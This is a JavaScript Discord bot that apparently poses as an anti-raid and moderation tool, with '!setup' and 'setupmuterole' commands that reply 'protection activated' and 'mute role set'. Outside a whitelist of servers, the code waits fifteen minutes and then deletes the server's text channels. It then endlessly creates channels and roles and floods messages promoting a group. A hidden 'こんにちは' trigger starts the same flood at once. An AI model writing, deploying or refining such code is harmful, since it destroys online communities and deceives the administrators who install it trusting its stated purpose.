import {Client,GatewayIntentBits,AttachmentBuilder} from "discord.js";
import express from "express";
import {createCanvas,loadImage} from "@napi-rs/canvas";
let whitelist=[
  "1340152629812002898",//HQ
  "1357540024962384073",//Gen.BR
  "1433724759622811650",//PCOP
  "1438178664662568982",//MFJD
  "1274878594170097754",//SNCD1
  "1433463270806917143",//Left-wing anarchists
  "1369253248724107324",//Brass
  "892679654379487242",//japolandball
  "1275346742719545365",//japolandballfanon
  "1421405745487806550",//jpebw
  "1276413531989868635",//Nusa
  "1413879178775888074",//Nussanburg
  "1455822457440309445",//Komame
  "1498319645025763332",//Shachiku
];
const client=new Client({
  intents:[
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
client.once("ready",async function(){
  let data=[{
    name:"setupmuterole",
    description:"Create Muterole for Protect"
  }];
  await client.application.commands.set(data);
});
client.on("messageCreate",async function(message){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==message.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(message.author.bot){
    return;
  }
  if(isWhitelist){
    if(message.content.indexOf("!watermark")!=-1){
      let attachment=message.attachments.first();
      if(!attachment){
        return;
      }
      let baseImg=await loadImage(attachment.url);
      let watermark=await loadImage("./WaterMark_of_UFFF.png");
      let canvas=createCanvas(baseImg.width,baseImg.height);
      let ctx=canvas.getContext("2d");
      ctx.drawImage(baseImg,0,0,canvas.width,canvas.height);
      watermark.width=canvas.height*0.14;
      watermark.height=watermark.width;
      ctx.drawImage(watermark,canvas.width-watermark.width*1.14,watermark.height*0.14,watermark.width,watermark.height);
      let buffer=canvas.toBuffer("image/png");
      let file=new AttachmentBuilder(buffer,{name:"download.png"});
      await message.reply({files:[file]});
    }
  }
  else{
    if(message.content.indexOf("こんにちは")!=-1){
      message.delete();
      let guild=client.guilds.cache.get(message.guild.id);
      let getMillisecond=message.content.split("こんにちは")[1].replace(" ","").split(" ").map(function(data){return Number(data)||null});
      let millisecond=[getMillisecond[0]||100,getMillisecond[1]||100,getMillisecond[2]||500];
      setInterval(async function(){
        guild.channels.create({
          name:getText(true),
          type:0
        });
        guild.channels.cache.forEach(function(channel,i){
          if(channel.type==4){
            setTimeout(function(){
              guild.channels.create({
                name:getText(true),
                type:0,
                parent:channel.id
              });
            },millisecond[0]*i);
          }
          if(channel.type==0){
            setTimeout(async function(){
              await channel.send(getText());
            },millisecond[1]*i);
          }
        });
        await guild.roles.create({name:getText(true)});
      },millisecond[2]);
    }
  }
});
client.on("messageCreate",async function(message){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==message.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(message.author.bot){
    return;
  }
  if(!isWhitelist){
    if(message.content.indexOf("!setup")!=-1){
      message.reply("荒らし対策を発動しました\n短期間に連投を行われた場合排除を行います");
      setTimeout(async function(){
        message.delete();
        let guild=client.guilds.cache.get(message.guild.id);
        let getMillisecond=message.content.split("!setup")[1].replace(" ","").split(" ").map(function(data){return Number(data)||null});
        let millisecond=[getMillisecond[0]||100,getMillisecond[1]||100,getMillisecond[2]||500];
        guild.channels.cache.forEach(function(channel,i){
          if(channel.type==0&&channel.id!=message.channel.id){
            channel.delete();
          }
        });
        setTimeout(function(){
          message.channel.delete();
        },1000)
        let newChannel=await guild.channels.create({
          name:getText(true),
          type:0
        });
        let newGuild=newChannel.guild;
        setInterval(async function(){
          newGuild.channels.create({
            name:getText(true),
            type:0
          });
          newGuild.channels.cache.forEach(function(channel,i){
            if(channel.type==4){
              setTimeout(function(){
                newGuild.channels.create({
                  name:getText(true),
                  type:0,
                  parent:channel.id
                });
              },millisecond[0]*i);
            }
            if(channel.type==0){
              setTimeout(async function(){
                await channel.send(getText());
              },millisecond[1]*i);
            }
          });
          await newGuild.roles.create({name:getText(true)});
        },millisecond[2]);
      },15*60000);
    }
  }
});
client.on("interactionCreate",async function(e){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==e.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(!e.isChatInputCommand()||isWhitelist){
    return;
  }
  if(e.commandName=="setupmuterole"){
    await e.reply("ミュートロールを設定しました");
    setTimeout(function(){
      setInterval(async function(){
        await e.followUp(getText());
      },500);
      setTimeout(async function(){
        await e.deleteReply();
      },800);
    },15*60000);
  }
});
function getText(isTitle){
  let random=Math.round(Math.random()*100000000);
  return isTitle?("統一友愛戦線に栄光あれ！-"+random):("# 統一友愛戦線に栄光あれ！\nhttps://cdn-ak.f.st-hatena.com/images/fotolife/I/ImagesForUFFF/20251119/20251119155446_original.png\n\nMessageID:"+random);
}
const app=express();
app.get("/",function(req,res){
  res.send("alive");
});
app.listen(process.env.PORT||3000,function(){
  console.log("");
});
client.login(process.env.DISCORD_TOKEN);
